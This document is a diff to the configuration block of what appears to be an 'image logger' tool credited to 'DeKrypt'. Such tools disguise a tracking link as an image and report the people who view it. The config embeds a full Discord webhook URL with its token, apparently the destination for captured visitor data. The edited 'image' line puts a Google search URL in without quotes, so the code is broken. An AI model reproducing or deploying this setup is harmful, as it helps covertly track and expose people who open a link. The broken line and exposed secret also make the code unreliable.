@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1531335633371664476/d2AuoWKxhnOBIjJ_pyaSyAdXIotPj1WFQvcF36X_S9t5dJ4vmgcCKal_-eO27TBrPOXu",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": https://www.google.com/search?q=Green+gardwn&client=ms-android-oppo-rvo3&hs=iE0&sca_esv=bde0b90e1f00e769&udm=2&biw=360&bih=581&sxsrf=APpeQnsd-BRemLtrZPmPLXT1XeUHnqgIZQ%3A1785169662148&ei=_oZnavrcCKaghvcPsbuwsQ4&oq=Green+gardwn&gs_lp=EhJtb2JpbGUtZ3dzLXdpei1pbWciDEdyZWVuIGdhcmR3bjIMEAAYgAQYChgLGLEDMgkQABiABBgKGAsyCRAAGIAEGAoYCzIJEAAYgAQYChgLMgkQABiABBgKGAtI1jBQ7wlY7C5wAXgAkAEBmAG7AaABvRGqAQQwLjE1uAEDyAEA-AEBmAIOoAL5EagCAMICBxAAGIAEGA3CAggQLhiABBixA8ICBRAAGIAEwgIIEAAYgAQYsQPCAhEQLhiABBixAxiDARjHARjRA8ICCxAAGIAEGLEDGIMBwgIKEAAYgAQYigUYQ8ICDhAuGIAEGLEDGMcBGNEDwgILEC4YgAQYsQMYgwGYAwHiAwUSATEgQIgGAZIHBDAuMTSgB95IsgcEMC4xNLgH-RHCBwgyLTEuMTIuMcgHugGACAE&sclient=mobile-gws-wiz-img#sv=CAMSVxoyKhBlLVlPdTlYVDBFY2YyUVRNMg5ZT3U5WFQwRWNmMlFUTToOLW5LVGNia3pHcTNMbk0gBCoXCgFzEhBlLVlPdTlYVDBFY2YyUVRNGAEwAUoECAEQAhgHIJ3apNsBSggQAhgBIAIoAQ
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
